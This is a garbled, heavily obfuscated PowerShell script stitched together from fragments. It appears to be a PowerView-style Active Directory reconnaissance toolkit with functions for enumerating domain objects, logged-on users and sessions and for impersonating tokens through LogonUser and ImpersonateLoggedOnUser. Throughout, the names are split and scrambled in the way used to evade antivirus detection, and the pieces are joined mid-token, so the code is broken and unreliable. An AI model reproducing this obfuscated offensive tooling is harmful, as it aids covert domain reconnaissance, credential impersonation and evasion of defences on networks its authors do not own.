        [ValidateSet(S5zAllS5z, {Z3b{0}{1}{2}Z3b-f S5zCS5z,S5zhildS5z,S5zrenS5z},{Z3b{0}{2}{1}Z3b -f S5zDescenS5z,S5zentsS5z,S5zdS5z},{Z3b{1}{0}Z3b -fS5zneS5z,S5zNoS5z},{Z3b{0}{1}{3}{2}Z3b-f S5zSeS5z,S5zlfAndS5z,S5zdrenS5z,S5zChilS5z})]
        [String]
        YoV{iNIJKHeIJKRiTAnCetYIJKPe},

        [Guid]
        YoV{iNheIJKRiIJKTEIJKdobjecIJKTTIJKYPE}
    )','RtyZ3b, YoV{NUIJKLL}, YoV{tIJKEmP}, YoV{NUIJKll})
                    YoV{objEcIJKTPropIJKeIJKRTiIJKEs}[YoV{_}] = [Int64](Z3b0x{0:x8}{1:x8}Z3b -f YoV{HIJKigh}, YoV{lIJKoW})
                }
                catch {
                    &(Z3b{0}{1}{3}{2}Z3b -f S5zWrite-VS5z,S5zerS5z,S5zseS5z,S5zboS5z) (S5z[CoS5z+S5znS5z+S5zvS5z+S5zert-LDAPS5z+S5zPropeS5z+S5zrtS5z+S5zy] S5z+S5zerrorS5z+S5z: S5z+Z3bYoV_Z3b)
                    YoV{OIJKBjECtPRIJKOpIJKERTiES}[YoV{_}] = YoV{PRIJKoP}[YoV{_}]
                }
            }
            elseif (YoV{pIJKRIJKoPerTiEs}[YoV{_}].Z3bCIJKoUnTZ3b -eq 1) {
                YoV{oIJKBjECTpropeIJKRIJKTIeS}[YoV{_}] = YoV{prOIJKpIJKeRIJKTIes}[YoV{_}][0]
            }
            else {
                YoV{ObIJKJectPRopIJKErIJKTIJKIES}[YoV{_}] = YoV{prIJKoIJKpEIJKRtIes}[YoV{_}]
            }
        }
    }
    try {
        &(Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zNew-ObjS5z,S5zctS5z) -TypeName (Z3b{1}{0}{2}Z3b -f S5zbjeS5z,S5zPSOS5z,S5zctS5z) -Property YoV{ObjECtIJKproIJKPErIJKTieS}
    }
    catch {
        &(Z3b{3}{2}{0}{1}Z3b -fS5zarS5z,S5zningS5z,S5zrite-WS5z,S5zWS5z) (S5z[ConveS5z+S5zrtS5z+S5z-LDAS5z+S5zPProperS5z+S5ztS5z+S5zy]S5z+S5z S5z+S5zErroS5z+S5zr S5z+S5zpS5z+S5zarsS5z+S5zing S5z+S5zLS5z+S5zDAP S5z+S5zpropertiS5z+S5zeS5z+S5zs S5z+S5z: S5z+Z3bYoV_Z3b)
    }
}
','+S5zerrS5z+S5zor S5z+S5zdS5z+S5zispoS5z+S5zsing S5z+S5zoS5z+S5zf S5z+S5ztS5z+S5zhe S5z+S5zResS5z+S5zulS5z+S5zts S5z+S5zobjeS5z+S5zct: S5z+Z3bY','zposeS5z,S5zsS5z,S5zdiS5z).Invoke()
        }
    }
}


function GeT-domAIIJKNIJKobjecTIJKAtTrIJKiIJKBIJKUteHIIJKstOry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{2}{5}{3}{4}{6}Z3b -fS5zaredVaS5z,S5zPSUseDeclS5z,S5zrS5z,S5zoreThS5z,S5zanAssiS5z,S5zsMS5z,S5zgnmentsS5z}, S5zS5z)]
    [OutputType({Z3b{5}{6}{7}{4}{2}{8}{1}{3}{0}Z3b -fS5ztoryS5z,S5zADObjectAttributeHS5z,S5zwS5z,S5zisS5z,S5zieS5z,S5zPS5z,S5zowerS5z,S5zVS5z,S5z.S5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, VALueFroMpipEliNe = YoV{trIJKUe}, vALUefROmPipELiNEbyPROpeRtynaME = YoV{TRIJKUE})]
        [Alias({Z3b{0}{3}{2}{1}Z3b-f S5zDiS5z,S5zmeS5z,S5zishedNaS5z,S5zstinguS5z}, {Z3b{0}{3}{2}{1}Z3b -fS5zSamAccouS5z,S5zmeS5z,S5zaS5z,S5zntNS5z}, {Z3b{0}{1}Z3b -fS5zNS5z,S5zameS5z}, {Z3b{0}{2}{1}{3}{4}Z3b -fS5zMembeS5z',' &(Z3b{1}{2}{0}Z3b -f S5z-ItEmS5z,S5zgES5z,S5zTS5z)  variAblE:6rK25p).Z3bvIJKAluEZ3b.(Z3b{2}{1}{0}Z3b -f S5zefTypeS5z,S5zyRS5z,S5zMakeBS5z).Invoke())),
    (&(Z3b{0}{1}Z3b -f S5zfS5z,S5zuncS5z) (Z3b{1}{0}{2}Z3b -f S5ztapS5z,S5zneS5z,S5zi32S5z) (Z3b{6}{2}{1}{3}{0}{4}{5}Z3b-fS5zTrS5z,S5zumeratS5z,S5zsEnS5z,S5zeDomainS5z,S5zusS5z,S5ztsS5z,S5zDS5z) ([Int]) @([String], [UInt32],   (  &(Z3b{2}{0}{1}Z3b -f S5zrIaBS5z,S5zlES5z,S5zvaS5z) (Z3b6RZ3b+Z3bKZ3b+Z3b25pZ3b) -vA ).(Z3b{2}{0}{3}{1}Z3b -f S5zakeByRefS5z,S5zpeS5z,S5zMS5z,S5zTyS5z).Invoke(),   YoV{6RkIJK25p}.(Z3b{3}{4}{0}{1}{2}Z3b-f S5zeBS5z,S5zyRefTS5z,S5zypeS5z,S5zMaS5z,S5zkS5z).Invoke())),
    (&(Z3b{1}{0}Z3b -f S5zuncS5z,S5zfS5z) (Z3b{0}{1}Z3b-fS5znetapiS5z,S5z32S5z) (Z3b{3}{4}{2}{0}{1}Z3b-fS5zferS5z,S5zFreeS5z,S5ziBufS5z,S5zNeS5z,S5ztApS5z) ([Int]) @([IntPtr])),
    (&(Z3b{0}{1}Z3b-f S5zfunS5z,S5zcS5z) (Z3b{0}{2}{1}Z3b-fS5zaS5z,S5z32S5z,S5zdvapiS5z) (Z3b{3}{0}{4}{2}{6}{5}{1}Z3b-f S5zonvertSidTS5z,S5zdS5z,S5zSS5z,S5zCS5z,S5zoS5z,S5zgSiS5z,S5ztrinS5z) ([Int]) @([IntPtr],  (&(Z3b{0}{1}{2}Z3b -fS5zGETS5z,S5z-vARiaBlS5z,S5zES5z)  qpU29).Z3bVaLIJKUeZ3b.(Z3b{2}{0}{1}{3}Z3b-f S5zBS5z,S5zyRefTS5z,S5zMakeS5z,S5zypeS5z).Invoke()) -SetLastError),
    (&(Z3b{0}{1}Z3b -fS5zfuS5z,S5zncS5z) (Z3b{0}{1}{2}Z3b -f S5zadvapS5z,S5zi3S5z,S5z2S5z) (Z3b{0}{4}{1}{2}{3}Z3b -fS5zOpenSCS5z,S5znaS5z,S5zgeS5z,S5zrWS5z,S5zMaS5z) ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&(Z3b{0}{1}Z3b -f S5zfunS5z,S5zcS5z) (Z3b{1}{0}Z3b -fS5zpi32S5z,S5zadvaS5z) (Z3b{1}{2}{0}{4}{3}Z3b -fS5zerviS5z,S5zClS5z,S5zoseSS5z,S5zeHandleS5z,S5zcS5z) ([Int]) @([IntPtr])),
    (&(Z3b{0}{1}Z3b-fS5zfuS5z,S5zncS5z) (Z3b{0}{1}Z3b -fS5zadvS5z,S5zapi32S5z) (Z3b{2}{1}{3}{0}Z3b -fS5zrS5z,S5zogonUS5z,S5zLS5z,S5zseS5z) ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   YoV{6IJKRIJKk25p}.(Z3b{0}{1}{2}Z3b -f S5zMakeByS5z,S5zRefTyS5z,S5zpeS5z).Invoke()) -SetLastError),
    (&(Z3b{0}{1}Z3b -fS5zfunS5z,S5zcS5z) (Z3b{1}{0}Z3b-fS5zdvapi32S5z,S5zaS5z) (Z3b{6}{3}{1}{0}{4}{2}{5}Z3b-f S5znatS5z,S5zersoS5z,S5zeS5z,S5zmpS5z,S5zeLoggS5z,S5zdOnUserS5z,S5zIS5z) ([Bool]) @([IntPtr]) -SetLastError),
    (&(Z3b{0}{1}Z3b -fS5zfuS5z,S5zncS5z) (Z3b{1}{0}{2}Z3b -f S5zvapi3S5z,S5zadS5z,S5z2S5z) (Z3b{0}{2}{1}Z3b -f S5zRevS5z,S5zrtToSelfS5z,S5zeS5z) ([Bool]) @() -SetLastError),
    (&(Z3b{0}',' { YoV{SIJKeIJKArcHeRARIJKgIJKUMEIJKNtS}[(Z3b{0}{1}{2}Z3b-f S5zPropeS5z,S5zrS5z,S5ztiesS5z)] = YoV{prOIJKPEIJKRIJKTIEs} }
        if (YoV{PSbOuIJKNIJKDparIJKAIJKmETERs}[(Z3b{0}{4}{2}{3}{1}Z3b -f S5zReS5z,S5zzeS5z,S5zltPageS5z,S5zSiS5z,S5zsuS5z)]) { YoV{SEIJKAIJKRcHIJKeRargumEnTs}[(Z3b{0}{3}{2}{1}Z3b-fS5zReS5z,S5zizeS5z,S5ztPageSS5z,S5zsulS5z)] = YoV{REsIJKULtpIJKAIJKgeSIJKiZe} }
        if (YoV{pSIJKBOUNIJKDPAIJKRaMIJKetIJKErs}[(Z3b{2}{3}{1}{0}{4}Z3b-fS5zimS5z,S5zeLS5z,S5zServerS5z,S5zTimS5z,S5zitS5z)]) { YoV{seAIJKRcHIJKERaIJKRGUmIJKents}[(Z3b{1}{2}{4}{0}{3}Z3b-fS5zLS5z,S5zServeS5z,S5zrTS5z,S5zimitS5z,S5zimeS5z)] = YoV{SeIJKRVERtIJKiMIJKEliIJKMIJKIT} }
        if (YoV{psIJKBOunIJKDIJKpAraMIJKeters}[(Z3b{2}{0}{1}Z3b -fS5zdS5z,S5zentialS5z,S5zCreS5z)]) { YoV{SeaIJKRIJKcHeIJKRARgUIJKmeIJKNTs}[(Z3b{1}{0}{2}Z3b -fS5zedentS5z,S5zCrS5z,S5zialS5z)] = YoV{cRedIJKEIJKNTiaL} }
        YoV{dIJKNSsearcIJKHEr} = &(Z3b{2}{4}{0}{1}{3}Z3b -fS5znSearS5z,S5zchS5z,S5zGet-DS5z,S5zerS5z,S5zomaiS5z) @SearcherArguments

        if (YoV{DNIJKSseaRIJKchIJKer}) {
            if (YoV{pSboUIJKNdPAIJKRaMIJKeTerS}[(Z3b{1}{0}Z3b -f S5zndOneS5z,S5zFiS5z)]) { YoV{REIJKsuIJKlTs} = YoV{DNIJKsSeARchIJKER}.(Z3b{0}{1}Z3b -fS5zFS5z,S5zindOneS5z).Invoke() }
            else { YoV{RIJKeIJKsulTs} = YoV{dIJKNSIJKsearIJKcHEr}.(Z3b{0}{1}Z3b-f S5zFS5z,S5zindAllS5z).Invoke() }
            YoV{rIJKeIJKsultS} JGO &(Z3b{3}{0}{1}{2}Z3b -f S5zeS5z,S5zre-ObS5z,S5zjectS5z,S5zWhS5z) {YoV{_}} JGO &(Z3b{0}{3}{2}{1}Z3b-fS5zForEachS5z,S5zjectS5z,S5zObS5z,S5z-S5z) {
                try {
                    YoV{oIJKUT} = &(Z3b{3}{2}{4}{0}{1}Z3b-f S5zPropertS5z,S5zyS5z,S5zveS5z,S5zConS5z,S5zrt-LDAPS5z) -Properties YoV{_}.Z3bPRoPIJKerIJKTiEsZ3b JGO &(Z3b{1}{2}{3}{0}Z3b-fS5ztS5z,S5zSS5z,S5zelectS5z,S5z-ObjecS5z) (Z3b{0}{1}Z3b -fS5znS5z,S5zameS5z),(Z3b{0}{3}{1}{2}Z3b-f S5zdistS5z,S5zedS5z,S5znameS5z,S5zinguishS5z),(Z3b{0}{1}Z3b-fS5zdnsrecorS5z,S5zdS5z),(Z3b{0}{1}{2}Z3b-f S5zwhS5z,S5zencreatS5z,S5zedS5z),(Z3b{0}{1}{3}{2}Z3b-f S5zwhS5z,S5zenchS5z,S5zedS5z,S5zangS5z)
                    YoV{OIJKUt} JGO &(Z3b{2}{1}{0}Z3b -fS5zmberS5z,S5zdd-MeS5z,S5zAS5z) (Z3b{1}{2}{0}Z3b -fS5zopertyS5z,S5zNS5z,S5zotePrS5z) (Z3b{0}{1}{2}Z3b-f S5zZonS5z,S5zeNS5z,S5zameS5z) YoV{ZIJKoneIJKNAIJKmE}

 ','5zURLS5z,S5ztoConfigS5z,S5zAuS5z)).Z3bsIJKValIJKUEZ3b

                YoV{WIJKpAd} = S5zS5z
                if (YoV{autOCIJKonIJKFIGUIJKRL} -and (YoV{autOIJKcIJKoIJKNfiIJKguRL} -ne S5zS5z)) {
                    try {
                        YoV{wpIJKAD} = (&(Z3b{2}{0}{1}Z3b -f S5zew-S5z,S5zObjectS5z,S5zNS5z) (Z3b{1}{3}{2}{0}Z3b -f S5zebClientS5z,S5zNeS5z,S5zWS5z,S5zt.S5z)).(Z3b{0}{2}{3}{1}Z3b-f S5zDowS5z,S5zgS5z,S5znloadStS5z,S5zrinS5z).Invoke(YoV{AUtoCONfiIJKGIJKURl})
                    }
                    catch {
                        &(Z3b{2}{0}{1}Z3b-fS5zrite-S5z,S5zWarningS5z,S5zWS5z) (S5z[Get-WMIRegPrS5z+S5zoxyS5z+S5z]S5z+S5z S5z+S5zErrorS5z+S5z S5z+S5zcS5z+S5zonneS5z+S5zctS5z+S5zing S5z+S5ztoS5z+S5z S5z+S5zAS5z+S5zutoCS5z+S5zonfigURLS5z+S5z S5z+S5z: S5z+Z3bYoVAutoConfigURLZ3b)
                    }
                }

                if (YoV{prOxYsIJKeIJKRVER} -or YoV{AUTIJKOCONfIJKIGIJKUrl}) {
                    YoV{OIJKUt} = &(Z3b{2}{0}{1}Z3b-f S5z-ObS5z,S5zjectS5z,S5zNewS5z) (Z3b{2}{1}{0}Z3b-f S5zctS5z,S5zjeS5z,S5zPSObS5z)
                    YoV{OIJKUT} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdd-MeS5z,S5zberS5z,S5zmS5z) (Z3b{1}{3}{2}{0}Z3b-fS5zpropertyS5z,S5zNS5z,S5zeS5z,S5zotS5z) (Z3b{1}{3}{2}{0}Z3b -fS5zmeS5z,S5zComputeS5z,S5zNaS5z,S5zrS5z) YoV{comIJKPIJKUTer}
                    YoV{oIJKUt} JGO &(Z3b{2}{1}{3}{0}Z3b -fS5zrS5z,S5zbS5z,S5zAdd-MemS5z,S5zeS5z) (Z3b{1}{2}{0}Z3b-fS5zropertyS5z,S5zNS5z,S5zotepS5z) (Z3b{1}{2}{0}Z3b -f S5zrS5z,S5zProxS5z,S5zyServeS5z) YoV{PIJKRIJKoXYIJKseRVER}
                    YoV{OIJKUT} JGO &(Z3b{0}{2}{1}Z3b-fS5zAS5z,S5zd-MemberS5z,S5zdS5z) (Z3b{0}{2}{1}{3}Z3b -fS5zNotS5z,S5zroS5z,S5zepS5z,S5zpertyS5z) (Z3b{0}{3}{2}{1}Z3b-fS5zAutoS5z,S5zRLS5z,S5znfigUS5z,S5zCoS5z) YoV{AIJKUIJKTIJKOIJKConFiGurL}
                    YoV{OIJKUT} JGO &(Z3b{3}{2}{1}{0}Z3b-fS5zberS5z,S5z-MemS5z,S5zdS5z,S5zAdS5z) (Z3b{0}{2}{1}Z3b -fS5zNoteprS5z,S5zyS5z,S5zopertS5z) (Z3b{0}{1}Z3b -fS5zWpS5z,S5zadS5z) YoV{WpIJKAd}
                    YoV{OIJKUT}.Z3bPSIJKoBjEIJKCtZ3b.Z3btyPeNIJKAmIJKesZ3b.(Z3b{0}{2}{1}Z3b-fS5zInS5z,S5zrtS5z,S5zse','oV_Z3b)
                        }
                    }
                    YoV{DFSIJKSEarIJKcIJKhER}.(Z3b{0}{1}Z3b -fS5zdiS5z,S5zsposeS5z).Invoke()

                    if (YoV{PIJKKt} -and YoV{PIJKkT}[0]) {
                        &(Z3b{1}{0}{2}Z3b-fS5zarsS5z,S5zPS5z,S5ze-PktS5z) YoV{pIJKKT}[0] JGO &(Z3b{0}{1}{2}{3}{4}Z3b -f S5zFS5z,S5zorEacS5z,S5zhS5z,S5z-OS5z,S5zbjectS5z) {
                            
                   ','IJKAIn}
                            &(Z3b{4}{3}{2}{1}{0}Z3b-f S5zboseS5z,S5zrS5z,S5zVeS5z,S5zite-S5z,S5zWrS5z) (S5z[GetS5z+S5z-DomaS5z+S5zinGroS5z+S5zupMS5z+S5zeS5z+S5zmber] S5z+S5zExS5z+S5ztrS5z+S5zacted S5z+S5zdomaS5z+S5ziS5z+S5zn S5z+Z3bS5zYoVGroupDomainS5z Z3b+S5zfS5z+S5zrom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                            YoV{gROuIJKPsIJKeaRIJKcHeR} = &(Z3b{1}{2}{0}{3}Z3b-fS5zaS5z,S5zGet-DoS5z,S5zmainSeS5z,S5zrcherS5z) @SearcherArguments
                        }
                    }
                    else {
                        YoV{idIJKeIJKNTIJKITyFILTEr} += Z3b(samAccountName=YoVIdentityInstance)Z3b
                    }
                }

                if (YoV{IDIJKeIJKNTiIJKTYfIIJKlTer} -and (YoV{iDentiIJKTyFIJKiIJKltIJKER}.(Z3b{0}{1}Z3b -f S5zTrS5z,S5zimS5z).Invoke() -ne S5zS5z) ) {
                    YoV{fiIJKlTIJKeR} += Z3b(JGOYoVIdentityFilter)Z3b
                }

                if (YoV{PSbOUndpIJKARAmeIJKTIJKeRS}[(Z3b{1}{2}{0}{3}Z3b-fS5zteS5z,S5zLS5z,S5zDAPFilS5z,S5zrS5z)]) {
                    &(Z3b{2}{0}{3}{1}Z3b -f S5zrite-VerbS5z,S5zeS5z,S5zWS5z,S5zosS5z) (S5z[Get-DoS5z+S5zmS5z+S5zaiS5z+S5znS5z+S5zGr','JKAldoIJKMaIN} }
        if (YoV{PSIJKBOUNdpAIJKRAIJKmIJKetEIJKRs}[(Z3b{0}{1}Z3b-fS5zServS5z,S5zerS5z)]) { YoV{PriNIJKcIIJKpIJKAlIJKsearchERaRIJKguMIJKeNIJKTS}[(Z3b{0}{1}Z3b -fS5zSerS5z,S5zverS5z)] = YoV{SIJKERIJKVer} }
        if (YoV{psIJKBOIJKUNdpaRAMIJKetERs}[(Z3b{2}{1}{0}Z3b-fS5zScopeS5z,S5zchS5z,S5zSearS5z)]) { YoV{prIJKINIJKcIPaLseAIJKRchIJKeRArIJKgIJKUMeNTS}[(Z3b{2}{0}{1}Z3b-fS5zrchScopS5z,S5zeS5z,S5zSeaS5z)] = YoV{SEaRcIJKhIJKSCopE} }
        if (YoV{PsbIJKoIJKUNdIJKPIJKARAMEtIJKERS}[(Z3b{1}{2}{0}{3}Z3b-f S5ztPaS5z,S5zResuS5z,S5zlS5z,S5zgeSizeS5z)]) { YoV{pIJKRincIJKipaLSEArcIJKherIJKArIJKGumEnTs}[(Z3b{1}{0}{4}{3}{2}Z3b-fS5zeS5z,S5zRS5z,S5zeS5z,S5zageSizS5z,S5zsultPS5z)] = YoV{RIJKeSuIJKLtIJKPAgESIIJKZE} }
        if (YoV{PSIJKBIJKoUIJKNDIJKpARAmEtErs}[(Z3b{2}{3}{4}{1}{0}Z3b -fS5ztS5z,S5zimiS5z,S5zSeS5z,S5zrverTimeS5z,S5zLS5z)]) { YoV{prinIJKcIIJKPaLIJKseaIJKRcHERIJKARGumENIJKTs}[(Z3b{0}{1}{3}{2}Z3b -f S','S5zccountnamS5z,S5zsS5z,S5zamaS5z,S5zeS5z),(Z3b{2}{0}{1}{3}Z3b -f','tS5z,S5zeS5z,S5zon.PSDataCoS5z,S5zn[ObjeS5z,S5zcS5z,S5ztS5z,S5ziS5z,S5zllS5z,S5zi',',S5zvariS5z,S5zaBLS5z)  (Z3bfoZ3b+Z3bQSnZ3b)  ).Z3bvaLIJKUEZ3b::Z3bTIJKoiIJKNT32Z3b([string]YoV{SIJKTr}[3])
                YoV{lOgoIJKNHOIJKUrS}[YoV{oIJKFfseT}+5] = [bool]   (&(Z3b{3}{0}{1}{2}Z3b-f S5ztS5z,S5z-S5z,S5zVaRIABLeS5z,S5zgES5z)  foqsN  -VaLU )::Z3bTIJKoINt32Z3b([string]YoV{sIJKTR}[2])
                YoV{LOIJKgonIJKHOurS}[YoV{OIJKFFIJKSET}+6] = [bool]  (  &(S5zGIS5z) (S5zvaRS5z+S5zIAblS5z+S5ze:FOqsS5z+S5znS5z)).Z3bvAlIJKUEZ3b::Z3bTIJKoiNIJKT32Z3b([string]YoV{sIJKTR}[1])
                YoV{lIJKogIJKOnIJKHoUrS}[YoV{OfFIJKsET}+7] = [bool]   ( &(S5zGiS5z)  vaRiAble:fOQSN  ).Z3bVAIJKluEZ3b::Z3bTOINTIJK32Z3b([string]YoV{sIJKTR}[0])
            }

            YoV{LoIJKGIJKOnhOUrs}
        }
    }

    Process {
        YoV{outIJKpUT} = @{
            (Z3b{2}{1}{0}Z3b-fS5zayS5z,S5zundS5z,S5zSS5z) = &(Z3b{5}{4}{3}{0}{2}{1}Z3b -f S5zsAS5z,S5zayS5z,S5zrrS5z,S5z-LogonHourS5z,S5zertToS5z,S5zConvS5z) -HoursArr YoV{LoIJKGONhouIJKRIJKSARRAy}[0..2]
            (Z3b{0}{1}Z3b -fS5zMS5z,S5zondayS5z) = &(Z3b{0}{3}{4}{2}{5}{1}Z3b -fS5zConS5z,S5zyS5z,S5zoS5z,S5zvertS5z,S5zTo-LogS5z,S5znHoursArraS5z) -HoursArr YoV{loGoIJKNHoUrIJKsIJKARRaY}[3..5]
            (Z3b{0}{1}Z3b-f S5zTuesdaS5z,S5zyS5z) = &(Z3b{3}{0}{2}{4}{5}{6}{1}Z3b-fS5zerS5z,S5zyS5z,S5ztTo-LogS5z,S5zConvS5z,S5zoS5z,S5znHoS5z,S5zursArraS5z) -HoursArr YoV{lOGOnHIJKouIJKRsAIJKRrAY}[6..8]
            (Z3b{3}{1}{0}{2}Z3b -f S5zdaS5','S5z,S5zSystS5z,S5ztpS5z,S5ztrS5z) -ArgumentList YoV{ofIJKFSeT}
                    YoV{InIJKFO} = YoV{NewIJKiIJKNtIJKpTr} -as YoV{WksTa_IJKUSEr_IJKINIJKFoIJK_1}

                    
                    YoV{lOIJKGIJKgEdon} = YoV{InIJKFo} JGO &(Z3b{1}{3}{4}{0}{2}Z3b-fS5zObjecS5z,S5zSeS5z,S5ztS5z,S5zleS5z,S5zct-S5z) (S5z*S5z)
                    YoV{lOGIJKgIJKeDon} JGO &(Z3b{0}{2}{1}Z3b-f S5zAdd-MembS5z,S5zrS5z,S5zeS5z) (Z3b{3}{1}{2}{0}Z3b-f S5zyS5z,S5zoteproperS5z,S5ztS5z,S5zNS5z) (Z3b{3}{2}{1}{0}Z3b -fS5zterNameS5z,S5zuS5z,S5zpS5z,S5zComS5z) YoV{CIJKOmIJKputIJKeR}
                    YoV{logGIJKEIJKDon}.Z3bpSoIJKBIJKjeCTZ3b.Z3btyPEIJKNaMIJKESZ3b.(Z3b{2}{0}{1}Z3b-fS5zeS5z,S5zrtS5z,S5zInsS5z).Invoke(0, (Z3b{1}{4}{0}{6}{3}{5}{2}Z3b -f S5zerViS5z,S5zPS5z,S5zUserInfoS5z,S5zw.S5z,S5zowS5z,S5zLoggedOnS5z,S5zeS5z))
                    YoV{OIJKFFset} = YoV{nEwiIJKNIJKTIJKpTr}.(Z3b{1}{0}Z3b-fS5zInt64S5z,S5zToS5z).Invoke()
                    YoV{OFIJKFSIJKEt} += YoV{incrIJKEMIJKENT}
                    YoV{lIJKoGGEIJKdIJKoN}
                }

                
                YoV{NIJKULL} = YoV{NeTAIJKpIIJK32}::(Z3b{4}{3}{0}{2}{1}Z3b-f S5zfferS5z,S5zeS5z,S5zFreS5z,S5zBuS5z,S5zNetApiS5z).Invoke(YoV{pTRIJKinFo})
            }
            else {
                &(Z3b{1}{2}{3}{0}Z3b -fS5zerboseS5z,S5zWS5z,S5zritS5z,S5ze-VS5z) Z3b[Get-NetLoggedon] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
            }
        }
    }

    END {
        if (YoV{LIJKoIJKgontOIJKkeN}) {
            &(Z3b{0}{1}{2}{6}{4}{5}{3}Z3b-f S5zInvS5z,S5zokeS5z,S5z-ReS5z,S5zSelfS5z,S5zTS5z,S5zoS5z,S5zvertS5z) -TokenHandle YoV{lOGoIJKNtOKIJKEN}
        }
    }
}


function geTIJK-neTsEIJKsSIon {


    [OutputType({Z3b{3}{1}{2}{4}{0}Z3b -fS5znfoS5z,S5zwerViS5z,S5zew.SesS5z,S5zPoS5z,S5zsionIS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITIoN = 0, ValUEfrOMpIpelINe = YoV{TIJKRUE}, vALuEFRoMPipelinEbyproPeRTYName = YoV{tIJKRUE})]
        [Alias({Z3b','S5zcouS5z,S5zntS5z,S5zsamac','ouS5z+S5zpMS5z+S5zember] S5z+S5zUS5z+S5zsing S5z+S5zadditS5z+S5ziS5z+S5zonal S5z+S5zLDS5z+S5zAP S5z+S5zfilS5z+S5ztS5z+S5zer: S5z+Z3bYoVLD','   }
            YoV{OIJKBjIJKeCtiIJKDEIJKNtiTy} = YoV{IIJKDIJKeNTIty}
        }

        YoV{oIJKUT} = &(Z3b{1}{0}{2}Z3b-fS5zOS5z,S5zNew-S5z,S5zbjectS5z) (Z3b{2}{1}{0}Z3b-f S5zjectS5z,S5zbS5z,S5zPSOS5z)
        YoV{OIJKUt} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdd-MS5z,S5zeS5z,S5zmberS5z) (Z3b{2}{0}{1}Z3b -fS5zproperS5z,S5ztyS5z,S5zNoteS5z) (Z3b{0}{1}Z3b -f S5zContS5z,S5zextS5z) YoV{cOnIJKTIJKEXt}
        YoV{OIJKUT} JGO &(Z3b{0}{2}{1}Z3b -fS5zAdd-S5z,S5zrS5z,S5zMembeS5z) (Z3b{1}{2}{0}Z3b-fS5ztyS5z,S5zNoteprS5z,S5zoperS5z) (Z3b{1}{0}{2}Z3b-f S5zenS5z,S5zIdS5z,S5ztityS5z) YoV{OIJKBIJKJectiIJKDEnTIJKiTY}
        YoV{OIJKUT}
    }
    catch {
        &(Z3b{0}{2}{1}Z3b-f S5zWrite-WaS5z,S5zingS5z,S5zrnS5z) (S5z[S5z+S5zGS5z+S5zet-PrS5z+S5zincipaS5z+S5zlContexS5z+S5zt] S5z+S5zErroS5z+S5zr S5z+S5zcrS5z+S5zeatiS5z+S5zng S5z+S5zbindS5z+S5zingS5z+S5z S5z+S5zfoS5z+S5zr S5z+S5zoS5z+S5zbject S5z+Z3b(S5zYoVIdentityS5z) Z3b+S5zcoS5z+S','pSbOIJKUndpIJKA','gement.Automation.CredentialAttribute()]
        YoV{cIJKREDIJKEIJKNtIaL} =   ( &(Z3b{0}{1}Z3b-fS5ziS5z,S5zteMS5z) vAriAblE:JFi ).Z3bVaIJKLuEZ3b::Z3bEmIJKPtYZ3b,

        [Switch]
        YoV{RIJKAW}
    )

    DynamicParam {
        YoV{uacVIJKAlIJKUeIJKNaMEs} =  (&(Z3b{1}{0}{2}Z3b-fS5zeT-ItS5z,S5zgS5z,S5zemS5z)  (Z3bvAriAbLe:Z3b+Z3b4XZ3b+Z3b0Z3b)  ).Z3bvIJKALueZ3b::(Z3b{2}{0}{1}Z3b -fS5ztNamS5z,S5zesS5z,S5zGeS5z).Invoke(YoV{UIJKACeIJKNUm})
        
        YoV{uIJKACIJKVaLUIJKeNIJKAMEs} = YoV{UaCvaIJKLIJKUIJKENaMIJKEs} JGO &(Z3b{1}{4}{3}{0}{2}Z3b -f S5zch-ObS5z,S5zFS5z,S5zjectS5z,S5zrEaS5z,S5zoS5z) {YoV{_}; Z3bNOT_YoV_Z3b}
        
        &(Z3b{5}{2}{0}{4}{1}{3}Z3b -fS5zicParamS5z,S5zeS5z,S5zDynamS5z,S5zrS5z,S5zetS5z,S5zNew-S5z) -Name (Z3b{0}{1}{2}Z3b -f S5zUS5z,S5zACS5z,S5zFilterS5z) -ValidateSet YoV{uIJKACIJKVaLIJKUenAMES} -Type ([array])
    }

    BEGIN {
        YoV{sIJKeaRcHErAIJKRgIJKUmEnts} = @{}
        if (YoV{PSbOUNdPaIJKRIJKAIJKMETERS}[(Z3b{0}{1}Z3b-fS5zDomS5z,S5zainS5z)]) { YoV{searCHERAIJKRIJKGIJKUMenTs}[(Z3b{1}{2}{0}Z3b-fS5zinS5z,S5zDS5z,S5zomaS5z)] = YoV{DoIJKmIJKAIn} }
        if (YoV{PSIJKBOuIJKNdpARAIJKmIJKETErs}[(Z3b{1}{2}{0}Z3b -fS5zsS5z,S5zPropS5z,S5zertieS5z)]) { YoV{seARCherArIJKgIJKUMEIJKNTs}[(Z3b{1}{2}{0}Z3b-f S5ztiesS5z,S5zPS5z,S5zroperS5z)] = YoV{pIJKRopErIJKTIES} }
        if (YoV{PSBOIJKUIJKNDparamIJKEtIJKeRs}[(Z3b{0}{1}{2}{3}Z3b -fS5zSeaS5z,S5zrS5z,S5zcS5z,S5zhBaseS5z)]) { YoV{SeIJKArcHEIJKRarIJKGIJKUIJKMeNTs}[(Z3b{1}{0}{2}Z3b-f S5zchBaS5z,S5zSearS5z,S5zseS5z)] = YoV{SeIJKARIJKChbIJKAse} }
        if (YoV{psbOIJKUndIJKPAraMETIJKeRs}[(Z3b{0}{1}Z3b -fS5zSS5z,S5zerverS5z)]) { YoV{SEARcheRIJKAIJKRGIJKUMIJKENts}[(Z3b{1}{0}{2}Z3b -f S5zrS5z,S5zSeS5z,S5zverS5z)] = YoV{SERIJKVeR} }
        if (YoV{PsBI','},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{COMIJKPUteIJKRIJKseIJKARChBaIJKSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}{3}Z3b -f S5zeratingSystS5z,S5zpS5z,S5zOS5z,S5zemS5z})]
        [String]
        YoV{coMIJKpIJKUt','eRange(1, 10000)]
        [Int]
        YoV{rEsIJKUltIJKpagIJKeSIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKERvERTIJKIIJKMIJKEIJKLIMIt},

        [Switch]
        YoV{tIJKOIJKmBStoNe},

